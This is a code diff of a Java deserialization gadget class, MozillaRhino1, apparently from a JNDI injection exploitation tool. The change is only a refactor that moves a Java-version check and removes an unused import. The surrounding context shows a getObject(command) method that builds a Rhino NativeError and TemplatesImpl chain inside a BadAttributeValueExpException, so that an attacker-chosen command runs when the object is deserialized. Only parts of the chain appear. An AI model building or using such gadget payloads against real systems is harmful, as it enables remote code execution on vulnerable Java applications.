@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -8,7 +7,6 @@ import com.qi4l.jndi.gadgets.utils.JavaVersion;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.mozilla.javascript.*;
-
 
 import javax.management.BadAttributeValueExpException;
 import java.lang.reflect.Constructor;
@@ -24,7 +22,11 @@ import java.lang.reflect.Method;
 @SuppressWarnings({"unused"})
 @Dependencies({"rhino:js:1.7R2"})
 @Authors({Authors.MATTHIASKAISER})
-public class MozillaRhino1 implements ObjectPayload<Object>{
+public class MozillaRhino1 implements ObjectPayload<Object> {
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isBadAttrValExcReadObj();
+    }
+
     public Object getObject(String command) throws Exception {
         Class       nativeErrorClass       = Class.forName("org.mozilla.javascript.NativeError");
         Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
@@ -66,9 +68,5 @@ public class MozillaRhino1 implements ObjectPayload<Object>{
         Reflections.setAccessible(valField);
         valField.set(badAttributeValueExpException, idScriptableObject);
         return badAttributeValueExpException;
-    }
-
-    public static boolean isApplicableJavaVersion() {
-        return JavaVersion.isBadAttrValExcReadObj();
     }
 }
